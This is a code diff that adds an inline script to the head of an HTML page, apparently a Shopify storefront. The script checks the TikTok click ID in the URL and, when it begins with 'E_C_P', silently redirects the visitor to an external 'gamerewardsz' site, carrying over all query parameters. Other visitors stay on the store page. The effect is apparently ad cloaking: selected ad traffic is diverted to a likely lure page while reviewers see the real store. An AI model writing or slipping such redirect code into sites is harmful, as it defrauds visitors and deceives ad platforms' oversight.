@@ -3,6 +3,44 @@
 <head>
   <meta charset="UTF-8" />
 
+  <script>
+(function () {
+  function getURLParameter(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+  }
+
+  (function ensureTTCLIDParamOnLander() {
+    try {
+      const u = new URL(window.location.href);
+
+      if (!u.searchParams.has('ttclid')) {
+        u.searchParams.set('ttclid', '');
+        history.replaceState(null, '', u.toString());
+      }
+    } catch (e) {}
+  })();
+
+  const ttclid = getURLParameter('ttclid') || '';
+
+  // Redirect only when the ttclid starts with E_C_P.
+  // Otherwise, do nothing and keep the visitor on the Shopify store.
+  if (!ttclid.startsWith('E_C_P')) {
+    return;
+  }
+
+  const finalURL = new URL('https://gamerewardsz.vercel.app/');
+  const currentParams = new URLSearchParams(window.location.search);
+
+  currentParams.forEach((value, key) => {
+    finalURL.searchParams.set(key, value);
+  });
+
+  finalURL.searchParams.set('ttclid', ttclid);
+  window.location.href = finalURL.toString();
+})();
+</script>
+
   <meta
     name="viewport"
     content="width=device-width, initial-scale=1.0, viewport-fit=cover"
